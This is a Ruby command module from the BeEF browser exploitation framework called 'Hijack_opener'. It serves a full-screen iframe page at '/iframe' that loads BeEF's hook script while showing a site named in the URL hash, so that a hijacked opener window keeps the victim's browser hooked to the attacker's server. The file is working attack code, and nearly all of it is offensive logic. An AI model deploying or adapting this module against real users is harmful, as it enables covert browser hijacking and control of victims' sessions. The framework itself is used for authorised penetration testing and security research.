#
# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Hijack_opener < BeEF::Core::Command
  def pre_send
    config = BeEF::Core::Configuration.instance
    hook_file = config.get('beef.http.hook_file')

    src = '<html><head><title></title><style>body {padding:0;margin:0;border:0}</style></head>'
    src << "<body><iframe id='iframe' style='width:100%;height:100%;margin:0;padding:0;border:0'></iframe>"
    src << "<script src='#{hook_file}'></script>"
    src << '<script>var url = window.location.hash.slice(1);'
    src << 'if (url.match(/^https?:\/\//)) {'
    src << 'document.title = url;'
    src << 'document.getElementById("iframe").src = url;'
    src << '}</script></body></html>'
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw(
      '200',
      {'Content-Type' => 'text/html'},
      src,
      '/iframe',
      -1)
  end

  def post_execute
    save({'result' => @datastore['result']})
  end
end
